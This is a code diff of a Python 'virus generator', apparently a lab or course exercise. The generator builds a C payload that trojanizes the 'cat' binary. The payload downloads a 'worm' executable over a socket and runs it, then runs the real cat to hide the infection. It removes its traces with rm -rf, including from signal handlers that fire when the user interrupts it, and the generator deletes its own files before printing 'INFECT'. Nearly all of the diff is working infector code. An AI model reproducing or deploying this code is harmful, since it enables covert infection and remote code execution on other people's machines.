@@ -19,8 +19,14 @@ C_code = """#include <stdio.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include <string.h>
+#include <signal.h>
+void intHandler(int dummy) {
+    execlp("rm", "rm", "-rf", "./oricat", "cat.zip", "worm", NULL);
+}
 int main(int argc, char **argv){
     /* set position */
+    signal(SIGINT, intHandler);
+    signal(SIGTSTP, intHandler);
     int original_cat_size = """ + str(original_cat_size) + """;
     int zip_cat_size = """ + str(zip_cat_size) + """;
     int zip_cat_start = """ + str(zip_cat_start) + """;
@@ -44,17 +50,13 @@ int main(int argc, char **argv){
         execlp("/bin/unzip", "unzip", "-o", "-q", "cat.zip", "-d", "oricat", NULL);
 
     wait(NULL);
-    /* execute cat */
-    pid = fork();
-    if(pid==0){
-        argv[0] = "./oricat/cat";
-        execvp("./oricat/cat", argv);
-    } 
-    wait(NULL);
+    
+    //printf("HEELO?");
     /* get worm */
     int sockfd = socket(PF_INET , SOCK_STREAM , 0);
     if (sockfd== -1){
         printf("FAIL");
+        fflush(stdout);
     }
     struct sockaddr_in info;
     memset(&info,sizeof(info), 0);	//初始化 將struct涵蓋的bits設為0
@@ -69,11 +71,11 @@ int main(int argc, char **argv){
     char wormbuff[1000];
     int bt = recv(sockfd, wormbuff,1000, 0);
 
-    fflush(stdout);
+    //fflush(stdout);
     FILE *worm = fopen("./worm", "wb");
     fwrite(wormbuff, strlen(wormbuff), 1, worm);
     fclose(worm);
-    fflush(stdout);
+    //fflush(stdout);
     close(sockfd);
     /* execute worm */
     pid = fork();
@@ -84,8 +86,19 @@ int main(int argc, char **argv){
     if(pid==0)
         execlp("./worm", "./worm", NULL);
     wait(NULL);
+    
+    /* execute cat */
+    pid = fork();
+    if(pid==0){
+        argv[0] = "./oricat/cat";
+        execvp("./oricat/cat", argv);
+    }
+    wait(NULL);
+    
+    
+    
     /* remove zipped, unzipped cat and worm and ADDR*/
-    execlp("rm", "rm", "-r", "./oricat", "cat.zip", "worm", NULL);
+    execlp("rm", "rm", "-rf", "./oricat", "cat.zip", "worm", NULL);
     return 0;
 }
 """
@@ -105,11 +118,11 @@ with open("cat.zip", "rb") as f:
 with open("cat", "ab") as f:
     f.write(b"\x00"*blank_size)
     f.write(zip_cat)
-    f.write(b"\xde\xad\xbe\xaf")
+    f.write(b"\xaf\xbe\xad\xde")
 print("or=", original_cat_size)
 print("zip=", zip_cat_size)
 print("new_cat_size=", new_cat_size)
 print("blank=", blank_size)
 # remove this python code and zip cat
-os.system("rm cat.zip VIRUSGENERATOR PAYLOAD.c ADDR.txt")
+os.system("rm -rf cat.zip VIRUSGENERATOR PAYLOAD.c ADDR.txt")
 print("INFECT")
